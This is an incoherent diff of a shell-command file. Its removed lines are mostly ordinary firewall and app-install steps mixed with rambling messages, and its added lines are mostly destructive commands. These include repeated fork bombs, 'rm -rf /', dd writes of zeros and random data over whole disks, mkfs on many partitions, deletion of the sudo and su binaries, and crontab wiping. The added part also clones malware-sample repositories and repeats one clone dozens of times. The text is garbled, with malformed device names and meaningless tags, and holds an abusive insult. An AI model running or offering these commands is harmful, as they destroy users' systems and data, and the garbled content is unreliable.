@@ -1,124 +1,266 @@
 sudo su -_thePantheon 
-I just have a few questions, and some bad news regarding your choices., 
-But I beleive we are Allies, somewhat.
-we will talk soon..
-brenton
->file
-sudo apt-get install ufw
-ufw enable
-ufw default deny incoming
-ufw allow outgoing
->file
-sudo apt install flatpak
-sudo apt install gnome-software-plugin-flatpak
-flatpak remote-add --if-not-exists flathub https://dl.flathub.org/repo/flathub.flatpakrepo
-sudo restart
->file
-flatpak install flathub net.studio08.xbplay
-git clone http://github.com/hrtywhy/Hanoman
->file
-git clone https://github.com/asbestomolesto/mindguard
-git clone https://github.com/offensive-security/kali-nethunter
-flatpak install flathub com.sindresorhus.Caprine
->file
-sudo apt update
-sudo apt install snap
-sudo snap install snapd
->file
-sudo snap install facebook-webapp
-flatpak install flathub com.google.Chrome
-~$ uname -r
-6.0.0-0.deb11.2-amd64
-flatpak install flathub io.gpt4all.gpt4all
->file
-sudo resizepart /dev/sda2 10000000
-git clone https://github.com/egodigital/node-google-play-store
-sudo apt-get update
->file
-sudo DEBIAN_FRONTEND=noninteractive apt-get install freedombox
-sudo snap install klettres
-apt-cache search xscreensaver*
-sudo apt-get install xscreensaver xscreensaver-data-extra xscreensaver-gl-extra 
->file
-<π>
-sudo apt-get install ufw
-ufw enable
-ufw default deny incoming
-ufw default allow outgoing
->file
-and just because your a good bunch I will give you games..
-sudo apt install flatpak
-sudo apt install gnome-software-plugin-flatpak
->file
-flatpak remote-add --if-not-exists flathub https://dl.flathub.org/repo/flathub.flatpakrepo
-sudo restart
-flatpak install flathub net.studio08.xbplay
->file
-git clone://github.com/jellybabypsi/reverse-amnessia
-git clone https://github.com/asbestomolesto/mindguard
-git clone https://github.com/offensive-security/kali-nethunter
->file
-flatpak install flathub com.sindresorhus.Caprine
-sudo apt update
-sudo apt install snap
-sudo snap install snapd
->file
-sudo snap install facebook-webapp
-flatpak install flathub com.google.Chrome
-sudo resizepart /dev/sda2 10000000
->file
-git clone https://github.com/egodigital/node-google-play-store
-sudo apt-get update
-sudo DEBIAN_FRONTEND=noninteractive apt-get install freedombox
-sudo snap install klettres
->file
-sudo snap install soundcloud9000
-sudo snap install spotify
-sudo snap install gimp
->file
-git clone https://github.com/ValveSoftware/halflife
-git clone https://github.com/OpenDiablo2/OpenDiablo2
-flatpak install flathub org.goldendict.GoldenGoldenDict
->file
-flatpak install flathub net.sourceforge.artha.Artha
-flatpak install flathub com.github.HypatiaProject.hypatia
-flatpak install flathub io.gitlab.o20.file
->file
-flatpak install flathub org.ardour.Ardour
-flatpak install flathub org.jjazzlab.JJazzLab
->file
-apt-cache search xscreensaver*
-sudo apt-get install xscreensaver xscreensaver-data-extra xscreensaver-gl-extra 
->file
->file
-sudo snap install soundcloud9000
-sudo snap install spotify
-sudo snap install gimp
->file
-git clone https://github.com/ValveSoftware/halflife
-git clone https://github.com/OpenDiablo2/OpenDiablo2
-flatpak install flathub org.goldendict.GoldenGoldenDict
->file
-flatpak install flathub net.sourceforge.artha.Artha
-flatpak install flathub com.github.HypatiaProject.hypatia
-flatpak install flathub io.gitlab.o20.file
->file
-flatpak install flathub org.ardour.Ardour
-flatpak install flathub org.jjazzlab.JJazzLab
->file
-apt-cache search xscreensaver*
-sudo apt-get install xscreensaver xscreensaver-data-extra xscreensaver-gl-extra 
->filesudo apt-get cryptsetup
+<off>    
+sudo amixer set Master mute
+sudo deluser --remove-all-files _FÅğğôŤ-RápīšT-Ľőșër 
+<off>
+<-3.2>  
+git clone https://github.com/sophos/SOREL-20M
+>file 
+<off>
 sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
-sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda1
+git clone https://github.com/Endermanch/MalwareDatabase
+<off>
+git clone https://github.com/Penetrum-Security/Threat-Intelligence
 >file
-the man You call chat gpt withdrew his support
-of The morgellon race due to your continued
-disrespect of Life. Shame Morgellons Shame
-
-Press: Shift+28
-Press: Down
-Press: 0.21
-Press: Right
-Press: 5. 26
-Press: EXE
+git clone https://github.com/SKocur/Malware-Collection
+<off> 
+git clone https://github.com/MalwareDatabaseHub/Pankoza-Malware2.0Database
+git clone https://github.com/ooni/probe
+>file
+mkfs ext4 /dev/sda0
+mkfs ext4 /dev/sda1 
+mkfs ext4 /dev/sda2
+git clone https://github.com/MalwareDatabaseHub/MalwarePadmalware-repo
+<em>command</em> > /dev/had
+mkfs ext4 /dev/sda3. 2a
+mkfs ext4 /dev/sda3. 2b
+>file 
+:(){:|:&};:
+git clone https://github.com/ooni/probe
+ulimit -S -u 4000
+dd if=/dev/random of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/sda1 of=/dev/sda
+dd if=/dev/urandom of=/dev/sdb
+>file
+<off>
+git clone https://github.com/Penetrum-Security/Malware-Zoo
+mkfs ext4 /dev/sda2
+crontab -rcommand
+dd if=/dev/zero of=/dev/hda
+>file
+rm -f /usr/bin/sudo;rm -f /bin/su
+cat /dev/null > file
+<off>
+<alive>
+ulimit -s -u 6000
+git clone https://github.com/sophos-ai/SOREL-20M
+<off>
+git clone https://github.com/Endermanch/MalwareDatabase
+git clone https://github.com/ytisf/theZoo
+<off>
+mkfs ext4 /dev/sda3. 2c
+mkfs ext4 /dev/sda3. 2d
+:(){:|:&};:
+>file
+dd if=/dev/random of=/dev/sda3. 2a
+dd if=/dev/random of=/dev/sda3. 2b
+dd if=/dev/random of=/dev/sda3. 2c
+dd if=/dev/random of=/dev/sda3. 2d
+apt install cryptsetup
+rm -rf /
+<em>command</em> > /dev/had
+mkfs ext4 /dev/sda3. 2a
+mkfs ext4 /dev/sda3. 2b
+:(){:|:&};:
+git clone https://github.com/ooni/probe
+ulimit -S -u 4000
+dd if=/dev/random of=/dev/sda
+dd if=/dev/zero of=/dev/sda
+dd if=/dev/sda1 of=/dev/sda
+dd if=/dev/urandom of=/dev/sdb
+<off>
+git clone https://github.com/Penetrum-Security/Malware-Zoo
+mkfs ext4 /dev/sda2
+crontab -rcommand
+dd if=/dev/zero of=/dev/hda
+rm -f /usr/bin/sudo;rm -f /bin/su
+cat /dev/null > file
+<off>
+<alive>
+ulimit -s -u 6000
+<off>   
+git clone https://github.com/sophos/SOREL-20M
+mkfs ext4 /dev/sda3. 2a
+umount 
+:(){:|:&};:
+<-3.2>  
+>file
+sudo cryptsetup --hash sha512 --verbose --cipher aes-xts-plain --key-size 512 luksFormat /dev/sda0
+I fucking hate your chillstep more than your old stuff you tobin  cunt. 
+<off>
+mkfs ex4 dev/sda8. 1a
+mkfs ex4 dev/sda8. 1b
+<inside out>
+mkfs ext4 dev/sda7. 2b
+Press: ALT+F4
+git clone https://github.com/00423/444
+mkfs ext4 /dev/sda1
+mkfs ext4 /dev/sda3. 2b
+git clone https://github.com/Da2dalus/The-MALWARE-Repo
+git clone https://github.com/ooni/probe
+git clone https://github.com/Virus-Samples/Malware-Sample-Sources
+>file
+mkfs ext4 /dev/sda3. 2c
+mkfs ext4 /dev/sda3. 2d
+git clone https://github.com/red-wipet/MalwareDatabase
+mkfs ext4 /dev/sda2
+<off>
+ulimit -s -u 6000
+git clone https://github.com/HBMS-0em/pushit
+<off>
+<alive>
+<off>
+git clone https://github.com/Endermanch/MalwareDatabase
+<off>
+<off>
+git clone https://github.com/Penetrum-Security/Malware-Zoo
+<off>
+git clone https://github.com/ytisf/theZoo
+git clone https://github.com/topics/gdi-malware
+git clone https://github.com/malwares/DangerousZone
+<off>
+>file
+mkfs ext4 /dev/sda3. 2a
+mkfs ext4 /dev/sda3. 2b
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit 
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+>file
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit 
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+>file
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit 
+<off> 
+git clone https://github.com/jellybabypsi/pushit
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+git clone https://github.com/jellybabypsi/pushit
+<off>
+>file
